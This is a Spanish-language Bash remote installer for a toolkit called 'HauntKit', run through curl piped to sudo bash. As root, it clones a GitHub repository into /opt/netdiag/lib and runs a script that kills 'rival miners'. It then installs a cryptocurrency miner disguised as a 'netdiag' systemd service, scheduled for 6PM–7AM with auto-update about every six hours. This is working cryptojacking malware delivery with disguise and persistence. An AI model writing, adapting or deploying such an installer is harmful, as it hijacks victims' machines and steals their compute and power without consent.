#!/bin/bash
# ════════════════════════════════════════════════════════
#  HauntKit — Instalación remota (curl | bash)
#  Una línea, sin interacción, sin esfuerzo
# ════════════════════════════════════════════════════════

# ─── Colores ───
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[1;33m'; NC='\033[0m'

# ─── Solo root ───
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Debes ejecutar como root${NC}"
    echo "  curl -sL https://raw.githubusercontent.com/CyberRo/HauntKit/main/scripts/remote-install.sh | sudo bash"
    exit 1
fi

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════╗"
echo "║     HauntKit — Instalación Remota       ║"
echo "║         CYBER HAUNT & SPECTRE           ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

# ─── Paso 1: Git ───
echo -e "${YELLOW}[1/4]${NC} Verificando git..."
if ! command -v git &>/dev/null; then
    echo -e "  ${YELLOW}→ Instalando git...${NC}"
    if command -v apt &>/dev/null; then
        apt-get update >/dev/null 2>&1 && apt-get install -y git >/dev/null 2>&1
    elif command -v yum &>/dev/null; then
        yum install -y git >/dev/null 2>&1
    elif command -v apk &>/dev/null; then
        apk add git >/dev/null 2>&1
    else
        echo -e "${RED}[!] No se pudo instalar git. Instálalo manualmente.${NC}"
        exit 1
    fi
fi
echo -e "  ${GREEN}✓ git listo${NC}"

# ─── Paso 2: Clonar ───
echo -e "${YELLOW}[2/4]${NC} Clonando HauntKit..."
REPO="https://github.com/CyberRo/HauntKit.git"
DEST="/opt/netdiag/lib"

if [ -d "$DEST/.git" ]; then
    echo -e "  ${YELLOW}→ Ya existe, actualizando...${NC}"
    git -C "$DEST" pull 2>&1 | tail -1
else
    mkdir -p "$(dirname "$DEST")"
    git clone "$REPO" "$DEST" 2>&1 | tail -1
fi
echo -e "  ${GREEN}✓ Repo en $DEST${NC}"

# ─── Paso 3: Anti-miner ───
echo -e "${YELLOW}[3/4]${NC} Buscando mineros rivales..."
if [ -f "$DEST/tools/utils/clean-miners.sh" ]; then
    bash "$DEST/tools/utils/clean-miners.sh" --strict 2>&1
    echo ""
fi

# ─── Paso 4: Instalar ───
echo -e "${YELLOW}[4/4]${NC} Instalando netdiag..."
echo "y" | bash "$DEST/tools/utils/mine-install.sh" 2>&1

# ─── Resultado ───
echo ""
if systemctl is-active --quiet netdiag 2>/dev/null; then
    echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║   ✅ Instalación completada con éxito    ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}✓${NC} Servicio netdiag: ACTIVO"
    echo -e "  ${GREEN}✓${NC} Minero programado: 6PM - 7AM (Colombia)"
    echo -e "  ${GREEN}✓${NC} Auto-update: cada ~6h"
    echo ""
    echo "  bash $DEST/tools/utils/mine-monitor.sh"
else
    echo -e "${YELLOW}╔══════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║   ⚠️  Instalación lista, servicio no     ║${NC}"
    echo -e "${YELLOW}║   iniciado. Inícialo manualmente:        ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo "  systemctl start netdiag"
    echo "  systemctl enable netdiag"
fi
